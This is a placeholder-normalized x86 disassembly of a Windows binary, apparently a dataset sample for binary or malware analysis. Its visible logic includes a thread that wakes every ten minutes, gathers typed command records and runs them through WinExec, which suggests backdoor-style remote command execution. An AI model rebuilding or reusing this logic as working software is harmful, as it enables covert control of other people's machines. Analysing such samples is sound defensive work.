lea ecx [ ebp - 0x11 ]
call sub_41a9c0
mov [ ebp - 0x14c ] eax
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x134 ] eax
mov [ ebp - 0x4 ] 0x17
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x270 ]
push edx
call sub_416570
add esp 0xc
mov [ ebp - 0x114 ] eax
mov eax [ ebp - 0x114 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x134 ]
push ecx
mov edx [ ebp - 0x11c ]
push edx
lea eax [ ebp - 0x240 ]
push eax
call sub_416630
add esp 0xc
mov [ ebp - 0x144 ] eax
mov ecx [ ebp - 0x144 ]
push ecx
lea ecx [ ebp - 0x48 ]
call sub_410070
lea ecx [ ebp - 0x240 ]
call sub_401830
mov [ ebp - 0x4 ] 0x17
lea ecx [ ebp - 0x270 ]
call sub_401830
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x2a0 ]
call sub_401830
push 0x0
push rw-data
lea edx [ ebp - 0x330 ]
push edx
lea ecx [ ebp - 0x11 ]
call sub_41a9c0
mov [ ebp - 0xf0 ] eax
mov eax [ ebp - 0xf0 ]
mov [ ebp - 0x100 ] eax
mov [ ebp - 0x4 ] 0x19
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x300 ]
push edx
call sub_416570
add esp 0xc
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0xd8 ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x4 ] 0x1a
mov ecx [ ebp - 0x100 ]
push ecx
mov edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x2d0 ]
push eax
call sub_416630
add esp 0xc
mov [ ebp - 0x110 ] eax
mov ecx [ ebp - 0x110 ]
push ecx
lea ecx [ ebp - 0x48 ]
call sub_410070
lea ecx [ ebp - 0x2d0 ]
call sub_401830
mov [ ebp - 0x4 ] 0x19
lea ecx [ ebp - 0x300 ]
call sub_401830
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x330 ]
call sub_401830
lea ecx [ ebp - 0x48 ]
call sub_401870
push eax
lea ecx [ ebp - 0x11 ]
call sub_41dd80
mov [ ebp - 0xd4 ] eax
mov edx [ ebp - 0xd4 ]
push edx
lea ecx [ ebp - 0x360 ]
call sub_4017f0
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_410070
lea ecx [ ebp - 0x360 ]
call sub_401830
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_422732
add esp 0x4
lea edx [ ebp - 0x48 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea ecx [ ebp - 0xc8 ]
call sub_4015c0
mov [ ebp - 0x4 ] 0x1b
push r--data
lea eax [ ebp - 0x90 ]
push eax
call sub_416760
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
lea eax [ ebp - 0x1c8 ]
push eax
lea ecx [ ebp - 0x11 ]
call sub_41de70
mov [ ebp - 0x124 ] eax
mov ecx [ ebp - 0x124 ]
push ecx
mov ecx rw-data
call sub_410d50
lea ecx [ ebp - 0x1c8 ]
call sub_40bdc0
push 0x0
push r--data
lea ecx [ ebp - 0x30 ]
call sub_410230
cmp eax [ r--data ]
jne r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_401850
jmp r-xdata
push r--data
lea ecx [ ebp - 0x90 ]
call sub_401850
mov ecx rw-data
call sub_410ff0
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0xcc ] 0x1
push r--data
lea ecx [ ebp - 0x180 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0xb
lea edx [ ebp - 0xcc ]
push edx
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x1f8 ]
push ecx
lea ecx [ ebp - 0x12 ]
call sub_4195e0
mov [ ebp - 0x128 ] eax
mov edx [ ebp - 0x128 ]
push edx
lea ecx [ ebp - 0x30 ]
call sub_410070
lea ecx [ ebp - 0x1f8 ]
call sub_401830
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x180 ]
call sub_40bdc0
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
call sub_40ef10
add esp 0xc
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
mov ecx rw-data
call sub_411050
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
call sub_416540
add esp 0x8
movzx edx al
test edx edx
je r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_401850
jmp r-xdata
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0xd0 ]
or ecx 0x1
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x90 ]
call sub_401830
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0xa8 ]
call sub_401830
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x48 ]
call sub_401830
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x30 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x78 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x60 ]
call sub_401830
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xc8 ]
call sub_40f9c0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x12 ]
call sub_40cb60
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x11 ]
call sub_40cb60
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x60 ]
call sub_401850
push r--data
lea ecx [ ebp - 0x78 ]
call sub_401850
push r--data
lea ecx [ ebp - 0x60 ]
call sub_4101d0
mov [ ebp - 0x18 ] 0x6581
push r--data
lea ecx [ ebp - 0x60 ]
call sub_4101d0
jmp r-xdata
sub_40f990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40f9e0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_40ffa0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40fa00
push ebp
mov ebp esp
push 0xffffffff
push sub_43b8c6
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1aac
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea ecx [ ebp - 0x1a12 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x1a2c ]
push eax
call sub_40f020
add esp 0x4
mov [ ebp - 0x4 ] 0x1
push sub_40ea60
push sub_40fe60
push 0x80
push 0x34
lea ecx [ ebp - 0x1a10 ]
push ecx
call sub_423ed3
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1a58 ] 0x0
push r--data
lea edx [ ebp - 0x1a2c ]
push edx
call sub_416760
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x1a4f ] 0x1
mov [ ebp - 0x4 ] 0x1
push sub_40ea60
push 0x80
push 0x34
lea ecx [ ebp - 0x1a10 ]
push ecx
call sub_423f3b
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1a2c ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1a12 ]
call sub_40cb60
mov al [ ebp - 0x1a4f ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebp - 0x1a2c ]
push ecx
call sub_416760
add esp 0x8
movzx edx al
test edx edx
je r-xdata
lea eax [ ebp - 0x1a2c ]
push eax
lea ecx [ ebp - 0x1a10 ]
push ecx
call sub_40ea90
add esp 0x8
mov [ ebp - 0x1a58 ] eax
mov [ ebp - 0x1a4c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1a4c ]
cmp eax [ ebp - 0x1a58 ]
jge r-xdata
mov ecx [ ebp - 0x1a4c ]
imul ecx ecx 0x34
lea edx [ ebp + ecx - 0x1a10 ]
sub esp 0x34
mov ecx esp
mov [ ebp - 0x1a6c ] esp
push edx
call sub_40fec0
mov [ ebp - 0x1a70 ] eax
call sub_40e9c0
add esp 0x34
mov [ ebp - 0x1a4e ] al
movzx eax [ ebp - 0x1a4e ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1a4c ]
imul ecx ecx 0x34
cmp [ ebp + ecx - 0x1a10 ] 0x1
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a4c ]
imul edx edx 0x34
cmp [ ebp + edx - 0x1a10 ] 0x2
je r-xdata
mov edx [ ebp - 0x1a4c ]
imul edx edx 0x34
lea eax [ ebp + edx - 0x1a0c ]
push eax
push r--data
lea ecx [ ebp - 0x1ab8 ]
push ecx
call sub_4167a0
add esp 0xc
mov [ ebp - 0x1a60 ] eax
push 0x0
mov ecx [ ebp - 0x1a60 ]
call sub_401870
push eax
call [ WinExec@IAT ]
cmp eax 0x1f
jbe r-xdata
mov edx [ ebp - 0x1a4c ]
add edx 0x1
mov [ ebp - 0x1a4c ] edx
lea ecx [ ebp - 0x1a13 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x1a44 ]
push ecx
lea ecx [ ebp - 0x1a12 ]
call sub_41c2c0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1a44 ]
call sub_40be90
push eax
lea ecx [ ebp - 0x1a88 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x5
push 0x0
lea edx [ ebp - 0x1a88 ]
push edx
lea eax [ ebp - 0x1aa0 ]
push eax
lea ecx [ ebp - 0x1a12 ]
call sub_41a9c0
mov [ ebp - 0x1a68 ] eax
mov ecx [ ebp - 0x1a68 ]
mov [ ebp - 0x1a64 ] ecx
mov [ ebp - 0x4 ] 0x6
push 0x0
push 0x1
mov edx [ ebp - 0x1a64 ]
push edx
mov eax [ ebp - 0x1a4c ]
imul eax eax 0x34
lea ecx [ ebp + eax - 0x1a0c ]
push ecx
lea ecx [ ebp - 0x1a13 ]
call sub_41bc30
mov [ ebp - 0x1a4d ] al
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x1aa0 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1a88 ]
call sub_40bdc0
movzx edx [ ebp - 0x1a4d ]
test edx edx
je r-xdata
mov eax [ ebp - 0x1a4c ]
imul eax eax 0x34
cmp [ ebp + eax - 0x1a10 ] 0x3
jne r-xdata
mov [ ebp - 0x1a5c ] 0x0
mov [ ebp - 0x1a5c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x1a44 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1a13 ]
call sub_40cb60
lea ecx [ ebp - 0x1a11 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x1a45 ] 0x0
mov eax [ ebp - 0x1a4c ]
imul eax eax 0x34
cmp [ ebp + eax - 0x1a10 ] 0x2
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x1a4c ]
imul ecx ecx 0x34
lea edx [ ebp + ecx - 0x19f4 ]
push edx
call sub_40e680
add esp 0x4
mov eax [ ebp - 0x1a4c ]
imul eax eax 0x34
lea ecx [ ebp + eax - 0x19f4 ]
push ecx
mov ecx rw-data
call sub_411030
mov dl [ ebp - 0x1a5c ]
mov [ ebp - 0x1a51 ] dl
lea ecx [ ebp - 0x1ab8 ]
call sub_401830
movzx eax [ ebp - 0x1a51 ]
test eax eax
je r-xdata
mov [ ebp - 0x1a52 ] 0x1
lea eax [ ebp - 0x1a52 ]
push eax
lea ecx [ ebp - 0x1a44 ]
push ecx
lea ecx [ ebp - 0x1a11 ]
call sub_41b0f0
mov [ ebp - 0x1a45 ] al
mov [ ebp - 0x1a50 ] 0x0
lea ecx [ ebp - 0x1a50 ]
push ecx
lea edx [ ebp - 0x1a44 ]
push edx
lea ecx [ ebp - 0x1a11 ]
call sub_41b0f0
mov [ ebp - 0x1a45 ] al
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1a11 ]
call sub_40cb60
mov eax [ ebp - 0x1a4c ]
imul eax eax 0x34
lea ecx [ ebp + eax - 0x19f4 ]
push ecx
call sub_40e680
add esp 0x4
mov edx [ ebp - 0x1a4c ]
imul edx edx 0x34
lea eax [ ebp + edx - 0x19f4 ]
push eax
mov ecx rw-data
call sub_411030
movzx edx [ ebp - 0x1a45 ]
test edx edx
je r-xdata
sub_40fe60
push ebp
mov ebp esp
push 0xffffffff
push sub_43b46b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
add ecx 0x4
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
call sub_40ffa0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_40fec0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b46b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x4
call sub_401790
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
push ecx
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
call sub_401790
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_40ff40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x927c0
xor eax eax
mov esp ebp
pop ebp
retn 0x4
call sub_40fa00
mov ecx [ ebp - 0x4 ]
push ecx
call [ Sleep@IAT ]
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
sub_40ff70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
push 0x0
push sub_40ff40
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov al 0x1
mov esp ebp
pop ebp
retn
sub_40ffa0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40ffd0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_4018b0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0xc
sub_410020
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x8 ]
call sub_412280
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_410070
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
push 0x0
push 0x1
mov ecx [ ebp - 0xc ]
call sub_401990
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea ecx [ ebp - 0x5 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx edx al
test edx edx
je r-xdata
xor ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0xc ]
call sub_412280
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_412410
mov ecx [ eax ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_4123e0
mov eax [ eax ]
push eax
mov ecx [ ebp - 0xc ]
call sub_4168a0
jmp r-xdata
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0xc ]
call sub_4022a0
sub_410150
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_4123b0
xor ecx ecx
je r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_401990
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0x8 ]
call sub_4022a0
sub_410230
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_401020
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_412440
mov esp ebp
pop ebp
retn 0x8
sub_410260
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
push eax
mov ecx [ ebp + 0x8 ]
call sub_401ab0
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_412520
mov esp ebp
pop ebp
retn 0x4
sub_410290
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_401020
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_412520
mov esp ebp
pop ebp
retn 0x4
sub_410300
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_410330
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] cx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_410350
push ebp
mov ebp esp
push 0xffffffff
push sub_43b39c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x8
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov eax [ ecx + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax - 0x4 ] edx
movzx edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x10 ]
add ecx [ edx + 0x4 ]
call sub_4126d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x10 ]
add ecx 0x8
call sub_412740
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
or ecx 0x1
mov [ ebp - 0x14 ] ecx
sub_410410
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx - 0x8 ] r--data
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x8 ]
mov eax [ edx + 0x4 ]
sub eax 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx - 0xc ] eax
mov esp ebp
pop ebp
retn
sub_410470
push ebp
mov ebp esp
push 0xffffffff
push sub_43bb78
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_413df0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
call sub_4107d0
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov ecx [ ebp - 0x20 ]
add ecx [ eax + 0x4 ]
call sub_4106c0
mov [ ebp - 0x38 ] eax
movzx ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x38 ]
call sub_412d90
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
call sub_40cb50
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x2c ]
push ecx
call sub_40cad0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0x24 ]
or ecx 0x4
mov [ ebp - 0x24 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
or eax 0x4
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x20 ]
add ecx [ edx + 0x4 ]
call sub_410690
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_413ea0
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
sub_4105b0
push ebp
mov ebp esp
push 0xffffffff
push sub_43ba88
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4106c0
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_413df0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x18 ]
call sub_4107d0
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_413ea0
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov ecx eax
call sub_412d10
cmp eax 0xffffffff
jne r-xdata
push 0x0
push 0x4
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_410690
sub_410690
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40da90
or eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_412610
sub_4106e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx - 0x18 ] r--data
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x18 ]
mov eax [ edx + 0x4 ]
sub eax 0x18
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x18 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx - 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_410720
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xa
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_412650
movzx eax al
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_412a50
mov esp ebp
pop ebp
retn 0xc
sub_410760
push ebp
mov ebp esp
push 0xffffffff
push sub_43b5b8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_412cb0
mov [ ebp - 0x4 ] 0x0
movzx ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov ecx [ edx ]
call sub_412830
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] al
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_4107d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_410800
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] ecx
